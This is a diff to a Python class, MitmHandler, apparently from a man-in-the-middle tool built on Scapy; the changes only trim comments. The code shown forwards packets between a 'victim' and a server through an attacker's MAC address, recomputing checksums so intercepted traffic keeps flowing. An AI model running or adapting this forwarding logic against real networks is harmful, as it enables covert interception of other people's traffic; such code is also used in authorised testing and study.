@@ -99,9 +99,6 @@ class MitmHandler:
             if not packet.haslayer(IP):
                 return
 
-            # Robust handling: Force full reconstruction of the IP layer
-            # This handles cases where in-place modification left the packet in a weird state
-            # or where Scapy returned raw bytes for the layer.
             try:
                 # We serialize the IP layer (bytes(...)) to commit any changes made by filters
                 # Then we deserialize (IP(...)) to get a fresh, clean packet object with correct checksums/lengths
@@ -114,12 +111,12 @@ class MitmHandler:
 
             # Direction logic
             if ip_pkt.src == self.victim_ip:
-                # Traffic from Victim -> Server
+                # Victim -> Server
                 ether = Ether(src=self.attacker_mac, dst=self.gateway_mac)
                 if self.logger: self.logger(f"[MITM] Forwarding Victim({ip_pkt.src}) -> Server({ip_pkt.dst}) via {self.gateway_mac}")
             
             elif ip_pkt.dst == self.victim_ip:
-                 # Traffic from Server -> Victim
+                 #Server -> Victim
                 ether = Ether(src=self.attacker_mac, dst=self.victim_mac)
                 if self.logger: self.logger(f"[MITM] Forwarding Server({ip_pkt.src}) -> Victim({ip_pkt.dst}) via {self.victim_mac}")
             else:
@@ -129,9 +126,6 @@ class MitmHandler:
             del ip_pkt.chksum
             if ip_pkt.haslayer(TCP): del ip_pkt[TCP].chksum
             if ip_pkt.haslayer(UDP): del ip_pkt[UDP].chksum
-
-            # Send without fragmentation for small redirects (Redirects are usually < 500 bytes)
-            # Fragmentation can sometimes cause issues if not strictly needed
             
             # Use raw socket if available for speed/reliability
             final_pkt = ether / ip_pkt
@@ -141,5 +135,4 @@ class MitmHandler:
                 sc.sendp(final_pkt, iface=self.interface, verbose=False)
 
         except Exception as e:
-            # self.logger(f"MITM Handler exception: {e}")
             return
